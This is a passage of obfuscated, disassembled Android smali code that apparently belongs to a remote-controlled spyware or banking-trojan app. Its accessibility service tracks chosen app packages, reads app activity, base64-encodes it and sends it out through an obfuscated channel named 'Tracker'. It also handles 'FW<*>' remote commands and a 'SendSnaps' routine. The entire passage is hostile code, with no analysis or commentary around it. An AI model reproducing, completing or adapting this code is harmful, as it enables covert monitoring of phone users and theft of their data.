    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    if-eqz v5, :cond_af

    .line 1337
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_af

    .line 1338
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5, v0, v3}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->AddTolist(Ljava/lang/String;Z)V

    goto/16 :goto_2a

    .line 1342
    :cond_76
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ShowNotifi:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Can\'t find App with ID: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1322
    :cond_77
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    if-eqz v5, :cond_78

    .line 1323
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    aget-object v6, v0, v8

    invoke-virtual {v5, v6}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_78

    .line 1324
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    aget-object v6, v0, v8

    invoke-virtual {v5, v6}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 1327
    :cond_78
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    if-eqz v5, :cond_af

    .line 1328
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    aget-object v6, v0, v8

    invoke-virtual {v5, v6}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_af

    .line 1329
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v5

    aget-object v0, v0, v8

    invoke-virtual {v5, v0}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_2a

    .line 1317
    :cond_79
    aget-object v5, v0, v8

    aget-object v6, v0, v7

    const/4 v7, 0x3

    aget-object v0, v0, v7

    invoke-static {v5, v6, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->SendSnaps(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 1286
    :cond_7a
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    if-eqz v0, :cond_7b

    .line 1287
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_7b

    .line 1288
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->PakgsAlert:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_21
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_7b

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/util/Map$Entry;

    .line 1289
    invoke-interface {v6}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 1290
    aget-object v7, p1, v3

    invoke-static {v7, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 1292
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "O:"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, ":"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v7}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ReadActivity(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->toBase64(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    goto :goto_21

    .line 1298
    :cond_7b
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    if-eqz v0, :cond_7c

    .line 1299
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_7c

    .line 1300
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NotFound:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/AlertsMap;->All()Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_22
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_7c

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/util/Map$Entry;

    .line 1301
    invoke-interface {v6}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 1304
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "N:Not Found:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "null#null"

    invoke-static {v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->toBase64(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    goto :goto_22

    .line 1312
    :cond_7c
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Tracker:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "L!"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_55
    .catch Ljava/lang/Exception; {:try_start_55 .. :try_end_55} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_55 .. :try_end_55} :catch_15

    goto/16 :goto_2a

    .line 1363
    :cond_7d
    :try_start_56
    aget-object v0, v10, v8

    const-string v12, "FW<*>"

    invoke-virtual {v0, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_56
    .catch Ljava/lang/Exception; {:try_start_56 .. :try_end_56} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_56 .. :try_end_56} :catch_15

    if-eqz v0, :cond_8a

    .line 1365
    :try_start_57
    aget-object v0, v10, v8

    const-string v10, "FW<*>"

    invoke-virtual {v0, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1366
    aget-object v5, v0, v3

    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v10

    const/16 v11, 0x53

    if-eq v10, v11, :cond_7f

    const/16 v11, 0x54

    if-eq v10, v11, :cond_7e

    packed-switch v10, :pswitch_data_0

    goto :goto_23

    :pswitch_0
    const-string v10, "C"

    invoke-virtual {v5, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_80

    const/4 v6, 0x0

    goto :goto_23

    :pswitch_1
    const-string v10, "B"

    invoke-virtual {v5, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_80

    const/4 v6, 0x1

    goto :goto_23

    :pswitch_2
    const-string v10, "A"

    invoke-virtual {v5, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_80

    const/4 v6, 0x2

    goto :goto_23

    :cond_7e
    const-string v10, "T"

    invoke-virtual {v5, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_80

    const/4 v6, 0x4

    goto :goto_23

    :cond_7f
    const-string v10, "S"

    invoke-virtual {v5, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_80

    const/4 v6, 0x3

    :cond_80
    :goto_23
    if-eqz v6, :cond_88

    if-eq v6, v8, :cond_86

    if-eq v6, v7, :cond_84

    const/4 v5, 0x3

    if-eq v6, v5, :cond_82

    const/4 v0, 0x4

